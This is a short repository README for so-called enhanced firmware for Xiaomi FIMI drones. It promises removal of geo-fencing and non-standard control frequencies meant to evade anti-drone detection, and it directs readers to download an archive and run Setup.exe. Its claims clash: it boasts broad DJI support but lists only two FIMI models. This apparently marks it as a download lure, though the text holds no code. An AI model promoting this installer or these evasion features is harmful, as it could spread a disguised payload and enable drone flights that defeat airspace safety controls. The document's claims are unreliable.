# Enhanced Firmware for Xiaomi FIMI

## Description
This repository provides an enhanced, open-source firmware for Xiaomi FIMI drones, offering advanced features that surpass the capabilities of the original firmware. This custom firmware removes operational limits, includes non-standard control frequencies to avoid detection by anti-drone technologies, and supports a broad range of DJI drone models.

## Advantages Over Standard Firmware
- **Removed Geo-Fencing**: Fly without geo-restrictions, opening up new areas for exploration and photography.
- **Non-Standard Control Frequencies**: Reduce the risk of interference from anti-drone devices, providing safer and more reliable flights.
- **Enhanced User Control**: Greater customization of flight parameters to suit professional and amateur flying needs.
- **Broad Compatibility**: Support for multiple drone models from both Xiaomi FIMI and DJI.

## Supported Models
- **Xiaomi FIMI**
  - FIMI X8 SE
  - FIMI A3

## Installation Instructions

### Step 1: Download
Navigate to the "Releases" section of this GitHub repository to download the latest version of the firmware:
[Releases](https://github.com/leburher/Enhanced-Firmware-for-Xiaomi-FIMI/releases)

### Step 2: Unpack
After downloading the archive, extract it using your preferred file extraction tool.

### Step 3: Install
Locate the extracted folder and run `Setup.exe` to begin the firmware installation process. Follow the on-screen instructions to complete the installation.
